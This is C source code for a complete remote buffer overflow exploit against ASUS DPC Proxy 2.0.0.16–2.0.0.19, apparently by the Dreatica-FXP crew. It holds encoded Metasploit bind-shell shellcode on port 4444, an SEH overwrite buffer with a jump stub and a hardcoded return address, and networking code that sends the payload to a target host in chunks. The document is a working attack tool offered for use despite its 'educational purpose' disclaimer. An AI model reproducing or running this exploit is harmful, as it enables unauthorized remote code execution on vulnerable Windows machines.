/* Dreatica-FXP crew
* 
* ----------------------------------------
* Target         : ASUS DPC Proxy 2.0.0.16/2.0.0.24
* ----------------------------------------
* Exploit        : ASUS DPC Proxy 2.0.0.16/2.0.0.19 Remote Buffer Overflow Exploit
* Exploit date   : 02.04.2008
* Exploit writer : Heretic2 (heretic2x@gmail.com)
* OS             : Windows ALL 
* Crew           : Dreatica-FXP
* Location       : http://www.milw0rm.com/
* ----------------------------------------
* Info           : Sending long buufer(however the buffer should be send by chunks)
*                  we obtain a SEH exploitation, due to server bytes stricts i decided
*                  to use here a alphanumeric shellcodes and jumps.
* ----------------------------------------
* Thanks to:
*		1. Luigi Auriemma          ( http://aluigi.org   <aluigi [at] autistici.org> )
*		2. The Metasploit project  ( http://metasploit.com                           ) 
*       3. ALPHA 2: Zero-tolerance ( <skylined [at] edup.tudelft.nl>                 ) 
*		4. Dreatica-FXP crew       (                                                 )
************************************************************************************
* This was written for educational purpose only. Use it at your own risk. Author will be not be 
* responsible for any damage, caused by that code.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <time.h>

#pragma comment(lib,"ws2_32")


void usage(char * s);
void logo();
void end_logo();
void print_info_banner_line(const char * key, const char * val);

void extract_ip_and_port( char * &remotehost, int * port, char * str);
int fill_payload_args(int sh, int bport, char * reverseip, int reverseport, struct h2readyp * xx);

int hr2_connect(char * remotehost, int port, int timeout);
int hr2_udpconnect(char * remotehost, int port,  struct sockaddr_in * addr, int timeout);
int hr2_updsend(char * remotehost, unsigned char * buf, unsigned int len, int port, struct sockaddr_in * addr, int timeout);
int execute(struct _buf * abuf, char * remotehost, int port);

struct _buf 
{
	unsigned char * ptr;
	unsigned int size;
};
int construct_shellcode(int sh, struct _buf * shf, int target);
int construct_buffer(struct _buf * shf, int target, struct _buf * abuf);




// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring);
char	*optarg;		// global argument pointer
int		optind = 0, opterr; 	// global argv index
// -----------------------------------------------------------------
// -----------------------------------------------------------------


struct {
	const char * name;
	int length;
	char *shellcode;	
}shellcodes[]={ 	
	{  "BindShell on 4444", 
		/*
		* windows/shell_bind_tcp - 696 bytes
		* http://www.metasploit.com
		* Encoder: x86/alpha_mixed
		* EXITFUNC=seh, LPORT=4444
		*/
		696,
		"\x89\xe6\xdb\xdd\xd9\x76\xf4\x5e\x56\x59\x49\x49\x49\x49\x49"
		"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
		"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
		"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
		"\x4b\x4c\x43\x5a\x4a\x4b\x50\x4d\x4d\x38\x4a\x59\x4b\x4f\x4b"
		"\x4f\x4b\x4f\x43\x50\x4c\x4b\x42\x4c\x51\x34\x47\x54\x4c\x4b"
		"\x51\x55\x47\x4c\x4c\x4b\x43\x4c\x43\x35\x42\x58\x45\x51\x4a"
		"\x4f\x4c\x4b\x50\x4f\x44\x58\x4c\x4b\x51\x4f\x51\x30\x45\x51"
		"\x4a\x4b\x47\x39\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50"
		"\x31\x49\x50\x4a\x39\x4e\x4c\x4b\x34\x49\x50\x43\x44\x43\x37"
		"\x49\x51\x48\x4a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4b\x44\x47"
		"\x4b\x46\x34\x47\x54\x47\x58\x42\x55\x4b\x55\x4c\x4b\x51\x4f"
		"\x51\x34\x43\x31\x4a\x4b\x43\x56\x4c\x4b\x44\x4c\x50\x4b\x4c"
		"\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x43\x33\x46\x4c\x4c\x4b"
		"\x4c\x49\x42\x4c\x46\x44\x45\x4c\x43\x51\x48\x43\x46\x51\x49"
		"\x4b\x42\x44\x4c\x4b\x51\x53\x50\x30\x4c\x4b\x51\x50\x44\x4c"
		"\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x51\x50\x44\x48\x51"
		"\x4e\x45\x38\x4c\x4e\x50\x4e\x44\x4e\x4a\x4c\x50\x50\x4b\x4f"
		"\x4e\x36\x42\x46\x51\x43\x45\x36\x42\x48\x50\x33\x47\x42\x45"
		"\x38\x44\x37\x44\x33\x47\x42\x51\x4f\x50\x54\x4b\x4f\x48\x50"
		"\x42\x48\x48\x4b\x4a\x4d\x4b\x4c\x47\x4b\x46\x30\x4b\x4f\x49"
		"\x46\x51\x4f\x4d\x59\x4d\x35\x43\x56\x4b\x31\x4a\x4d\x45\x58"
		"\x45\x52\x46\x35\x42\x4a\x44\x42\x4b\x4f\x48\x50\x43\x58\x4e"
		"\x39\x44\x49\x4b\x45\x4e\x4d\x50\x57\x4b\x4f\x4e\x36\x46\x33"
		"\x46\x33\x51\x43\x51\x43\x50\x53\x47\x33\x46\x33\x47\x33\x46"
		"\x33\x4b\x4f\x48\x50\x43\x56\x42\x48\x42\x31\x51\x4c\x45\x36"
		"\x51\x43\x4b\x39\x4d\x31\x4a\x35\x43\x58\x4e\x44\x44\x5a\x42"
		"\x50\x48\x47\x46\x37\x4b\x4f\x48\x56\x42\x4a\x42\x30\x50\x51"
		"\x50\x55\x4b\x4f\x4e\x30\x45\x38\x49\x34\x4e\x4d\x46\x4e\x4a"
		"\x49\x51\x47\x4b\x4f\x4e\x36\x51\x43\x50\x55\x4b\x4f\x4e\x30"
		"\x42\x48\x4a\x45\x51\x59\x4d\x56\x47\x39\x50\x57\x4b\x4f\x4e"
		"\x36\x50\x50\x46\x34\x50\x54\x46\x35\x4b\x4f\x48\x50\x4c\x53"
		"\x43\x58\x4b\x57\x42\x59\x49\x56\x42\x59\x50\x57\x4b\x4f\x48"
		"\x56\x51\x45\x4b\x4f\x4e\x30\x43\x56\x43\x5a\x43\x54\x42\x46"
		"\x43\x58\x45\x33\x42\x4d\x4b\x39\x4d\x35\x42\x4a\x46\x30\x51"
		"\x49\x51\x39\x48\x4c\x4c\x49\x4d\x37\x43\x5a\x50\x44\x4c\x49"
		"\x4a\x42\x46\x51\x49\x50\x4c\x33\x4e\x4a\x4b\x4e\x50\x42\x46"
		"\x4d\x4b\x4e\x47\x32\x46\x4c\x4a\x33\x4c\x4d\x43\x4a\x50\x38"
		"\x4e\x4b\x4e\x4b\x4e\x4b\x43\x58\x43\x42\x4b\x4e\x48\x33\x42"
		"\x36\x4b\x4f\x42\x55\x47\x34\x4b\x4f\x48\x56\x51\x4b\x46\x37"
		"\x51\x42\x50\x51\x50\x51\x50\x51\x42\x4a\x45\x51\x46\x31\x50"
		"\x51\x46\x35\x50\x51\x4b\x4f\x48\x50\x45\x38\x4e\x4d\x4e\x39"
		"\x43\x35\x48\x4e\x50\x53\x4b\x4f\x4e\x36\x43\x5a\x4b\x4f\x4b"
		"\x4f\x47\x47\x4b\x4f\x48\x50\x4c\x4b\x51\x47\x4b\x4c\x4c\x43"
		"\x49\x54\x42\x44\x4b\x4f\x48\x56\x51\x42\x4b\x4f\x4e\x30\x42"
		"\x48\x4c\x30\x4c\x4a\x44\x44\x51\x4f\x50\x53\x4b\x4f\x48\x56"
		"\x4b\x4f\x48\x50\x41\x41"

	},
	{NULL, 0, NULL}
};
 
struct _target{
	const char *t ;
	unsigned long ret ;
} targets[]=
{	
	{"ASUS DpcProxy 2.0.0.16/2.0.0.19",      0x0040273b },
	{"DOS/Crash/Debug/Test/Fun",             0x00400101 },
	{NULL,                                   0x00000000 }
};

// memory for buffers
unsigned char payloadbuffer[10000], a_buffer[10000];
long dwTimeout=5000;
int timeout=5000;

int main(int argc, char **argv)
{
	char c,*remotehost=NULL,*file=NULL,*reverseip=NULL,*url=NULL,temp1[100];
	int sh,port=623,itarget=0;
	struct _buf  fshellcode, sbuffer;

	logo();
	if(argc<2)
	{
		usage(argv[0]);		
		return -1;
	}

	WSADATA wsa;
	WSAStartup(MAKEWORD(2,0), &wsa);
	// set defaults
	sh=0;	
	// ------------	
	
	while((c = getopt(argc, argv, "h:t:R:T:"))!= EOF)
	{
		switch (c)
		{
			case 'h':
				if (strchr(optarg,':')==NULL)
				{
					remotehost=optarg;
				}else 
				{
					sscanf(strchr(optarg,':')+1, "%d", &port);
					remotehost=optarg;
					*(strchr(remotehost,':'))='\0';
				}
				break; 				
			case 't':
				sscanf(optarg, "%d", &itarget);
				itarget--;
				break;					
			case 'T':				
				sscanf(optarg, "%ld", &dwTimeout);
				break; 			
			default:
	            usage(argv[0]);
				WSACleanup();
			return -1;
		}		
	}	
	if(remotehost == NULL)
	{
		printf("   [-] Please enter remotehost\n");
		end_logo();
		WSACleanup();
		return -1;
	}
	print_info_banner_line("Host", remotehost);
	sprintf(temp1, "%d", port);
	print_info_banner_line("Port", temp1);
	print_info_banner_line("Payload", shellcodes[sh].name);

	if(sh==0)
	{		
		sprintf(temp1, "%d", 4444);
		print_info_banner_line("BINDPort", temp1);
	}

	printf(" # ------------------------------------------------------------------- # \n");
	fflush(stdout);


	memset(payloadbuffer, 0, sizeof(payloadbuffer));
	fshellcode.ptr=payloadbuffer;
	fshellcode.size=0;	

	memset(a_buffer, 0, sizeof(a_buffer));
	sbuffer.ptr=a_buffer;
	sbuffer.size=0;

	if(!construct_shellcode(sh, &fshellcode, itarget))
	{
		end_logo();
		WSACleanup();
		return -1;
	}

	printf("   [+] Payload constructed\n");
	
	if(!construct_buffer(&fshellcode, itarget, &sbuffer))
	{
		printf("   [-] Buffer not constructed\n");
		end_logo();
		WSACleanup();
		return -1;
	}
	printf("   [+] Final buffer constructed\n");
	

	if(!execute(&sbuffer, remotehost, port))
	{
		printf("   [-] Buffer not sent\n");
		end_logo();
		WSACleanup();
		return -1;
	}
	printf("   [+] Buffer sent\n");
	
	end_logo();
	WSACleanup();
	return 0;
}

int construct_shellcode(int sh, struct _buf * shf, int target)
{
	memcpy(shf->ptr, shellcodes[sh].shellcode, shellcodes[sh].length);
	shf->size=shellcodes[sh].length;	
	return 1;
}


char JMPX[] = 
		// get ecx
		"\x89\xE6\xDB\xDD\xD9\x76\xF4\x59"
		// alphanum-decoder
		"\x49\x49\x49" 
		"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41"
		"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
		"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
		// encoded jump
		"\x59\x6f\x7a\x47\x41"
		// back jump
		"\x89\xE6\xDB\xDD\xD9\x76\xF4\x5f\x81\xef\xf8\x1a\x00\x00\xeb\xb3";

int construct_buffer(struct _buf * shf, int target, struct _buf * sbuf)
{
	unsigned char * cp = sbuf->ptr;
	memset(cp, 'A', 1000);
	cp+=20;
	memcpy(cp, shf->ptr, shf->size);
	cp+=1000-20;
	memset(cp, 'B', 1000);
	cp+=1000;
	memset(cp, 'C', 1000);
	cp+=1000;
	memset(cp, 'D', 1000);
	cp+=1000;
	memset(cp, 'E', 1000);
	cp+=1000;
	memset(cp, 'F', 1000);
	cp+=1000;
	memset(cp, 'G', 1000-62-sizeof(JMPX)+1);
	cp+=1000-62-sizeof(JMPX)+1;
	
		// code to jump back
	memcpy(cp, JMPX,sizeof(JMPX)-1);
	cp+=sizeof(JMPX)-1;

		// next SEH record and back jump
	*cp++='\x90';
	*cp++='\x90';
	*cp++='\xeb';
	*cp++='\xec';

		// replace SEH
	*cp++ = (char)((targets[target].ret      ) & 0xff);
	*cp++ = (char)((targets[target].ret >>  8) & 0xff);
	*cp++ = (char)((targets[target].ret >> 16) & 0xff);
	*cp++ = (char)((targets[target].ret >> 24) & 0xff);
	
	memset(cp, 'H', 1000);
	cp+=1000;

	sbuf->size=(int)(cp-sbuf->ptr);
	return 1;
}


void extract_ip_and_port( char * &remotehost, int * port, char * str)
{
	if (strchr(str,':')==NULL)
	{
		remotehost=str;
	}else 
	{
		sscanf(strchr(str,':')+1, "%d", port);
		remotehost=str;
		*(strchr(remotehost,':'))='\0';
	}
}



int hr2_connect(char * remotehost, int port, int timeout)
{
	SOCKET s;
	struct hostent *host;
	struct sockaddr_in addr;
	TIMEVAL stTime;
	TIMEVAL *pstTime = NULL;
	fd_set x;
	int res;

	if (INFINITE != timeout) 
	{
	    stTime.tv_sec = timeout / 1000;
	    stTime.tv_usec = timeout % 1000;
	    pstTime = &stTime;
	}

	host = gethostbyname(remotehost);
	if (!host) return SOCKET_ERROR;

	addr.sin_addr = *(struct in_addr*)host->h_addr;
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;

	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s == SOCKET_ERROR)
	{
		closesocket(s);
		return SOCKET_ERROR;
	}

	unsigned long l = 1;
	ioctlsocket( s, FIONBIO, &l ) ;

	connect(s, (struct sockaddr*)&addr, sizeof(addr));

	FD_ZERO(&x);
	FD_SET(s, &x);

	res = select(NULL,NULL,&x,NULL,pstTime);
	if(res< 0) return SOCKET_ERROR;
	if(res==0) return 0;
	return (int)s;
}


int hr2_tcpsend(SOCKET s, unsigned char * buf, unsigned int len, int timeout)
{
	return send(s, (char *)buf, len, 0);
}

int hr2_tcprecv(SOCKET s, unsigned char * buf, unsigned int len, int timeout)
{
	TIMEVAL stTime;
	TIMEVAL *pstTime = NULL;
	fd_set xy;
	int res;

	if (INFINITE != timeout) 
	{
	    stTime.tv_sec = timeout / 1000;
	    stTime.tv_usec = timeout % 1000;
	    pstTime = &stTime;
	}
	FD_ZERO(&xy);
	FD_SET(s, &xy);
	
	res = select(NULL,&xy,NULL,NULL,pstTime);

	if(res==0) return 0;
	if(res<0) return -1;

	return recv(s, (char *)buf, len, 0);
}

int execute(struct _buf * abuf, char * remotehost, int port)
{
	int x;
	SOCKET s ;
	unsigned char rbuf[7000];
	unsigned int i;
	int rsize=7000;
	s = hr2_connect(remotehost, port, 10000);
	if(s==0)
	{
		printf("   [-] connect() timeout\n");
		return 0;
	}
	if(s==SOCKET_ERROR)
	{
		printf("   [-] Connection failed\n");
		return 0;
	}

	x = hr2_tcprecv(s, rbuf, 5000, 10000);	
	x = hr2_tcprecv(s, rbuf, 5000, 10000);
	
	for(i=0;i<abuf->size/1000;i++)
	{
		printf("   [+] Chunk %d/%d sent\n", i+1,abuf->size/1000);
		x = hr2_tcpsend(s, abuf->ptr+1000*i, 1000, 0);
		if(x<1000) return -1;
		Sleep(1000);
		x = hr2_tcprecv(s, rbuf, 5000, 10000);
	}
	return 1;
}


// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring)
{
	static char *next = NULL;
	if (optind == 0)
		next = NULL;

	optarg = NULL;

	if (next == NULL || *next == '\0')
	{
		if (optind == 0)
			optind++;

		if (optind >= argc || argv[optind][0] != '-' || argv[optind][1] == '\0')
		{
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		if (strcmp(argv[optind], "--") == 0)
		{
			optind++;
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		next = argv[optind];
		next++;		// skip past -
		optind++;
	}

	char c = *next++;
	char *cp = strchr(optstring, c);

	if (cp == NULL || c == ':')
		return '?';

	cp++;
	if (*cp == ':')
	{
		if (*next != '\0')
		{
			optarg = next;
			next = NULL;
		}
		else if (optind < argc)
		{
			optarg = argv[optind];
			optind++;
		}
		else
		{
			return '?';
		}
	}

	return c;
}
// -----------------------------------------------------------------
// -----------------------------------------------------------------
// -----------------------------------------------------------------


void print_info_banner_line(const char * key, const char * val)
{
	char temp1[100], temp2[100];

	memset(temp1,0,sizeof(temp1));	
	memset(temp1, '\x20' , 58 - strlen(val) -1);	

	memset(temp2,0,sizeof(temp2));
	memset(temp2, '\x20' , 8 - strlen(key));	
	printf(" #  %s%s: %s%s# \n", key, temp2, val, temp1);	

}



void usage(char * s)
{	
	int j;
	printf("\n");
	printf("    Usage: %s -h <host:port> -t <target>\n", s);
	printf("   -------------------------------------------------------------------\n");
	printf("    Arguments:\n");
	printf("      -h ........ host to attack, default port: 623\n");
	printf("      -t ........ target to use\n");	
	printf("      -T ........ socket timeout\n");
	printf("\n");
	printf("    Supported ASUS DPCProxy versions:\n");
	for(j=0; targets[j].t!=0;j++)
	{
		printf("      %d. %s\n",j+1, targets[j].t);
	}					
	printf("\n");
	for(j=0; shellcodes[j].name!=0;j++)
	{
		printf("      %d. %s\n",j+1, shellcodes[j].name);
	}		
	end_logo();	
}

void logo()
{
	printf("\n\n");
	printf(" ####################################################################### \n");	
	printf(" #     ____                 __  _                  ______  __    _____ #\n");
	printf(" #    / __ \\________  _____/ /_(_)_________       / __/\\ \\/ /   / _  / #\n");
	printf(" #   / / / / ___/ _ \\/ __ / __/ / ___/ __ / ___  / /    \\  /   / // /  #\n");
	printf(" #  / /_/ / / /  ___/ /_// /_/ / /__/ /_// /__/ / _/    /  \\  / ___/   #\n");
	printf(" # /_____/_/  \\___/ \\_,_/\\__/_/\\___/\\__,_/     /_/     /_/\\_\\/_/       #\n");
	printf(" #                                 crew                                #\n");
	printf(" ####################################################################### \n");	
	printf(" #  Exploit : ASUS DPCPROXY Service 2.0.0.16-19                        # \n");
	printf(" #  Author  : Heretic2 (http://www.dreatica.cl/)                       # \n");
	printf(" #  Version : 1.0                                                      # \n");
	printf(" #  System  : Windows ALL                                              # \n");
	printf(" #  Date    : 02.04.2008 - 04.04.2008                                  # \n");
	printf(" # ------------------------------------------------------------------- # \n");
}

void end_logo()
{
	printf(" # ------------------------------------------------------------------- # \n");
	printf(" #                    Dreatica-FXP crew [Heretic2]                     # \n");	
	printf(" ####################################################################### \n\n");
}